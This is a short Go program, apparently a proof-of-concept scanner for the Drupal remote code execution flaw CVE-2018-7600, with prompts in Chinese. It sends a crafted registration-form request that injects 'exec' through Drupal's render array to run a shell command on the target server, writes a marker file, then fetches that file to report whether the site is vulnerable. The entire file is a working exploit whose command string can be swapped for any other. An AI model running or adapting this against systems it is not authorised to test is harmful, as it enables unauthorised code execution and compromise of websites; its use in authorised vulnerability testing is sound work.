package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func Cve_2018_7600_poc() {
	reader1 := bufio.NewReader(os.Stdin)
	fmt.Println("[*] 输入测试的url: ")
	url, _, err := reader1.ReadLine()
	if err != nil {
		panic(err)
	}

	target := string(url)

	commonds := "echo 'test:)22212' | tee index2.txt"
	url1 := string(target) + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
	payload1 := fmt.Sprintf("form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=%s", commonds)
	reqp1, err := http.Post(url1, "application/x-www-form-urlencoded", strings.NewReader(payload1))
	if err != nil {
		panic(err)
	}
	defer reqp1.Body.Close()
	url2 := target + "/index2.txt"
	reqg1, err := http.Get(url2)
	if err != nil {
		panic(err)
	}
	body1, err := ioutil.ReadAll(reqg1.Body)
	if err != nil {
		panic(err)
	}
	if strings.Contains(string(body1), "test:)") && reqg1.Status == "200 OK" {
		fmt.Printf("[+] %s存在CVE-2018-7600漏洞", target)
	} else {
		fmt.Printf("[-] %s不存在CVE-2018-7600漏洞", target)
	}
}
